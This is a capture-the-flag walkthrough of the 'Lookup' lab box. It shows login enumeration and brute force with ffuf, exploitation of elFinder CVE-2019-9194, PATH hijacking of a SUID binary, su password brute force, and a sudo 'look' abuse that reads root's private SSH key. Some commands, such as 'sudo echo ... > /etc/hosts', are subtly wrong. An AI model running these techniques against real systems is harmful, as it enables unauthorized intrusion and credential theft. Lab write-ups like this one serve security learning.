# Introduction
Lookup is a box that got me familiar with many different techniques. The box is an Apache web server running the elFinder web file manager version 2.1.47, vulnerable to [CVE-2019-9194](https://www.rapid7.com/db/modules/exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection/). A Metasploit module is available for exploiting this vulnerability.

> The PHP connector component allows unauthenticated users to upload
> files and perform file modification operations, such as resizing and
> rotation of an image. The file name of uploaded files is not validated,
> allowing shell metacharacters.
>
> When performing image operations on JPEG files, the filename is passed
> to the `exiftran` utility without appropriate sanitization, causing
> shell commands in the file name to be executed, resulting in remote
> command injection as the web server user.

After finding a vulnerable binary, I used path-hijacking to have this binary read a malicious `id`, which spit out a bunch of potential passwords /shrug. I used a [GitHub repo](https://github.com/d4t4s3c/suForce) to cycle through these passwords for the user `think` as the malicious `id` was set for that user. Using GTFObins, user `think` could execute a `look` binary to read any file with root permissions. Reading a private root SSH key and downloading it to the host yielded root access.

# Recon
I ran an nmap scan of open ports using the top 100 because that's usually all that's necessary for these basic boxes: `nmap -sC -sV --top-ports 100 RHOST`:

```
<SNIP>

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 445f26674b4a919b597a9559c84c2e04 (RSA)

80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))

|_http-title: Did not follow redirect to http://lookup.thm
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS

```

`RHOST:80` redirects us to an unresolvable domain: `lookup.thm`, so we'll have to add it to our hosts file.
`sudo echo "RHOST lookup.thm" > /etc/hosts`.

It's a pretty basic login form. I typed in `admin` and a password and it yielded something along the lines of:
> Wrong password.
> Redirecting in 3 seconds.

I tried `root` as the username and a passwword and it yielded something like:
> Wrong username and password.
> Redirecting in 3 seconds.

Well that's great! The server is telling us what usernames are valid to enumerate through. We'll use Burpsuite to check out these requests a little more.
![Burpsuite Output](burpsuite_output_lookup.png)

```

username=admin&password=foo
```

This request implies that whenever we attempt a login on the form/server, we are sending a POST request to `/login.php`, using the HTTP Content-Type: `application/x-www-form-urlencoded`.
- We can also note that a successful username attempt has a response content-length of 62, so when we fuzz for usernames we can use the `-ms` flag to tell us if we've enumerated a username successfully.

Let's fuzz through the usernames with a wordlist (thanks **seclists**).
```
┌──(averie㉿kali_wsl)-[/usr/share/seclists/Usernames]
└─$ ffuf -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=foo" -w "/usr/share/seclists/Usernames/Names/names.txt" -u http://lookup.thm/login.php -ms 62 -c

...

```

# Initial Access

Now we can try enumerating through a password wordlist for `jose` (I filtered size 62 since that was the response size for an incorrect password, but it'd probably be best practice to match the status of 302 (redirect code)).
```
┌──(averie㉿kali_wsl)-[/usr/share/seclists/Usernames]
└─$ ffuf -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=jose&password=FUZZ" -w "/usr/share/wordlists/rockyou.txt" -u http://lookup.thm/login.php -fs 62 -c

...

password123             [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 123ms]
```

Logging in with these credentials sends us to another unresolvable domain, notably because of the subdomain `files.` (`files.lookup.thm`). We'll `sudo echo "RHOST files.lookup.thm" > /etc/hosts` and navigate to the URL.

![](elfinder_lookup.png)

Looks like we're in an encrypted file server. `credentials.txt` reads `think : nopassword` and attempting these credentials anywhere (SSH, the form to the file server) didn't work. However, navigating to "About this software" (the question mark icon) yielded our potential primary attack vector.

![](elfinder_version_info.png)

With a quick Google search, I found that elFinder v2.1.47 is in fact vulnerable to [CVE-2019-9194](https://www.rapid7.com/db/modules/exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection/). CVE-2019-9194 is available as a default Metasploit module as `exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection`.

# Exploitation

I dropped into a shell by running `shell`, peeked around at my UID (`www-data`), working directory (`/var/www/files.lookup.thm/public_html/elFinder/php`) and upgraded the shell by running:
`/bin/bash -i` and `export TERM=xterm`.

To search for SUID binaries: `find / -perm -4000 -type f 2>/dev/null`
- This command looks for any files with the SUID bit set.
- SUID bit (4000) means to "*run this file with the privileges of its owner, not the one running it*"
- So we're looking for SUID bit files, specifically binaries that are owned by root.

On this box, it returns:
```
<SNIP>
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/sbin/pwm
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/umount
```

Running `pwm` returns:
```
pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: www-data
[-] File /home/www-data/.passwords not found
```

So, as part of the `pwm` binary's procedure, it scrapes the output of whatever `id` returns.
```
www-data@lookup:/tmp$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We can use a technique called **PATH hijacking** to write our own `id` binary in a folder we control, like `/tmp`, and point the `pwm` binary to our custom `id` binary by setting our `PATH` variable to `/tmp` before the rest of default system paths. This tricks `pwm` into executing our custom `id` binary instead of the real one. We'll have to make `id` executable as well.
```
www-data@lookup:/tmp$ echo "echo 'uid=33(think) gid=33(www-data) groups=33(www-data)'" > id
www-data@lookup:/tmp$ cat id
cat id
echo 'uid=33(think) gid=33(www-data) groups=33(www-data)'
www-data@lookup:/tmp$ chmod +x id
```
*Specifically, when our custom `id` binary is run, it echoes a false output that the current user has the UID of `think`. `pwm` uses the output of `id` to make it's decision, so by altering `id` we can do malicious things with `pwm`.*

We'll then run `export PATH=/tmp:$PATH`, which appends `/tmp` to the beginning of `$PATH` so that binaries like `pwm` will look for binaries in `/tmp` for its needs.

```
www-data@lookup:/tmp$ pwm | tee passwords.txt
pwm | tee passwords.txt
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: think
jose1006
jose1004
jose1002

<SNIP>
```

Let's brute-force these potential passwords by downloading [this GitHub repo](https://github.com/d4t4s3c/suForce). We'll make it executable `chmod +x suForce` and move `suForce` and `passwords.txt` to `/dev/shm` since `/tmp` is not allowing this to execute.

> What is `/dev/shm`?
>
> - It’s a **temporary filesystem** (tmpfs) stored in **RAM**.
> - It’s writable by all users (`drwxrwxrwt` permissions, like `/tmp`).
> - It often allows **execution of binaries or scripts**, even when `/tmp` has `noexec` set (i.e., execution is blocked there).


```
./suForce -u think -w passwords.txt
───────────────────────────────────
 code: d4t4s3c     version: v1.0.0
───────────────────────────────────
🎯 Username | think
📖 Wordlist | passwords.txt
🔎 Status   | 1/51/1%/[!] Running 'id' command to extract th
🔎 Status   | <SNIP>
💥 Password | <SNIP>
───────────────────────────────────
```

Awesome, we'll login to `think`.
```
www-data@lookup:/tmp$ su think
su think
Password: <SNIP>
whoami
think
/bin/bash -i
bash: cannot set terminal process group (714): Inappropriate ioctl for device
bash: no job control in this shell
think@lookup:/tmp$
```

We'll then `sudo -l` to get a list of binaries that are executable by `think`.
```
think@lookup:/var/www/files.lookup.thm/public_html/elFinder/php$ sudo -S -l
sudo -S -l
[sudo] password for think: <SNIP>
Matching Defaults entries for think on lookup:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User think may run the following commands on lookup:
    (ALL) /usr/bin/look
```

Checking out [GTFObins](https://gtfobins.github.io/gtfobins/look/):
> If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
>
>     LFILE=file_to_read
>     sudo look '' "$LFILE"

Knowing that SSH is enabled on this box, we'll see if we can extract a private key from `root`.
```
think@lookup:/tmp$ LFILE=/root/.ssh/id_rsa
LFILE=/root/.ssh/id_rsa
think@lookup:/tmp$ sudo -S look '' "$LFILE" | tee /tmp/id_rsa
sudo -S look '' "$LFILE"
[sudo] password for think: <SNIP>
-----BEGIN OPENSSH PRIVATE KEY-----
...
-----END OPENSSH PRIVATE KEY-----
